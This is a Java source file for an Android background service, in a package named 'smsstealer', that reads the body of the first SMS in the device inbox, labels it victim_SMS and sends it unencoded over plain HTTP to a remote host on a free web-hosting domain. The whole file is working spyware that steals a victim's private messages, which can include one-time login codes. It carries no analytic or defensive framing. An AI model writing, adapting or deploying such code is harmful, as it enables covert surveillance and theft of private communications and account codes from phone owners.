package com.example.shiva.smsstealer;

import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.support.annotation.Nullable;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

/**
 * Created by Shiva on 9/14/2017.
 */

public class MySmsService extends Service {
    @Nullable
    @Override

    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String victim_SMS=getSMS();
        uploadSMS(victim_SMS);
        return  super.onStartCommand(intent, flags, startId);
    }

    public String getSMS()
    {
        String str = " ";
        Uri inboxURI = Uri.parse("content://sms/inbox");
        Cursor cur = getContentResolver().query(inboxURI, null, null, null, null);
        if (cur.moveToFirst()) {
            str = cur.getString(cur.getColumnIndexOrThrow("body"));
        }
        str=str.replace(" ","_");
        return str;

    }
    public void uploadSMS(String str)
    {
        RequestQueue queue = Volley.newRequestQueue(this);
        String url = "http://smssaver.000webhostapp.com/helloworld/insert_data.php?sms_content=" + "\"" + str + "\"";
        StringRequest stringRequest = new StringRequest(Request.Method.GET, url,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {

                    }
                }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {


            }
        });
        queue.add(stringRequest);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }
}
